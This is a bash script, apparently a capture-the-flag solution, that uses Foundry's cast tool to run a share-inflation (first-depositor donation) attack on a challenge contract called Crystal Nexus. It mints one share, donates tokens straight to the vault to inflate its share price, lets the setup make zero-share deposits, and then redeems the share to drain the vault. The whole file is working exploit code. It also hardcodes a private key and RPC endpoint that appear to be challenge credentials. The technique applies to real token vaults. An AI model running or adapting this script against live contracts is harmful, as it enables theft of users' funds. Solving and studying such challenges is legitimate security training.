#!/usr/bin/env bash
set -euo pipefail
echo "[*] Crystal Nexus – Essence Inflation Exploit"
# ==============================
# CONFIG
# ==============================
RPC_URL="http://challenges.1pc.tf:50502/1c416d74-4a6a-483c-aedd-b0891ec8f62c"
PRIVATE_KEY="2f6ae158981a2dde0ab6d3e4e4bb8fdba2ca7e4d3eacfac6fa685a81566a53fe"
SETUP_CONTRACT="0xaCa31f5DeF147Abe4F33bFe391465ae0C408257B"
PLAYER_ADDR="0x85B38a48d7c1F6f02a60FBcAA413a811C15825ff"
DONATION_ESSENCE="6000" # must be < PLAYER_ESSENCE (10000)
# ==============================
# DISCOVERY
# ==============================
echo "[*] Fetching deployed contracts..."
ESSENCE=$(cast call $SETUP_CONTRACT "essence()(address)" --rpc-url $RPC_URL)
NEXUS=$(cast call $SETUP_CONTRACT "nexus()(address)" --rpc-url $RPC_URL)
echo " Essence : $ESSENCE"
echo " Nexus : $NEXUS"
# ==============================
# PRE-CHECKS
# ==============================
echo "[*] Checking initial balances..."
PLAYER_BAL=$(cast call $ESSENCE "balanceOf(address)(uint256)" $PLAYER_ADDR --rpc-url $RPC_URL)
TOTAL_CRYSTALS=$(cast call $NEXUS "totalCrystals()(uint256)" --rpc-url $RPC_URL)
echo " Player ESS : $(cast from-wei $PLAYER_BAL)"
echo " Crystals : $TOTAL_CRYSTALS"
if [[ "$TOTAL_CRYSTALS" != "0" ]]; then
  echo "[!] Abort: Nexus already initialized"
  exit 1
fi
# ==============================
# STEP 1 — APPROVE
# ==============================
echo "[*] Approving Nexus to spend ESS..."
cast send $ESSENCE "approve(address,uint256)" \
  $NEXUS $(cast max-uint) \
  --private-key $PRIVATE_KEY --rpc-url $RPC_URL > /dev/null
# ==============================
# STEP 2 — FIRST ATTUNEMENT
# ==============================
echo "[*] Attuning 1 wei (become sole crystal holder)..."
cast send $NEXUS "attune(uint256)" 1 \
  --private-key $PRIVATE_KEY --rpc-url $RPC_URL > /dev/null
CRYSTALS=$(cast call $NEXUS "crystalBalance(address)(uint256)" $PLAYER_ADDR --rpc-url $RPC_URL)
[[ "$CRYSTALS" == "1" ]] || { echo "[!] Failed: did not receive 1 crystal"; exit 1; }
# ==============================
# STEP 3 — VAULT INFLATION
# ==============================
echo "[*] Inflating amplitude via direct ESS transfer..."
cast send $ESSENCE "transfer(address,uint256)" \
  $NEXUS $(cast to-wei $DONATION_ESSENCE) \
  --private-key $PRIVATE_KEY --rpc-url $RPC_URL > /dev/null
AMP=$(cast call $NEXUS "amplitude()(uint256)" --rpc-url $RPC_URL)
echo " Amplitude now: $(cast from-wei $AMP) ESS"
# ==============================
# STEP 4 — SETUP RITUALS (ZERO-CRYSTAL ATTUNES)
# ==============================
echo "[*] Triggering Setup.conductRituals()..."
cast send $SETUP_CONTRACT "conductRituals()" \
  --private-key $PRIVATE_KEY --rpc-url $RPC_URL > /dev/null
TOTAL_CRYSTALS=$(cast call $NEXUS "totalCrystals()(uint256)" --rpc-url $RPC_URL)
[[ "$TOTAL_CRYSTALS" == "1" ]] || { echo "[!] Unexpected crystal mint"; exit 1; }
# ==============================
# STEP 5 — DRAIN VAULT
# ==============================
echo "[*] Dissolving 1 crystal..."
cast send $NEXUS "dissolve(uint256,address)" \
  1 $PLAYER_ADDR \
  --private-key $PRIVATE_KEY --rpc-url $RPC_URL > /dev/null
# ==============================
# FINAL STATE
# ==============================
FINAL_BAL=$(cast call $ESSENCE "balanceOf(address)(uint256)" $PLAYER_ADDR --rpc-url $RPC_URL)
SOLVED=$(cast call $SETUP_CONTRACT "isSolved()(bool)" --rpc-url $RPC_URL)
echo "================================"
echo "[+] Final ESS balance: $(cast from-wei $FINAL_BAL)"
echo "[+] Challenge solved: $SOLVED"
echo "================================"
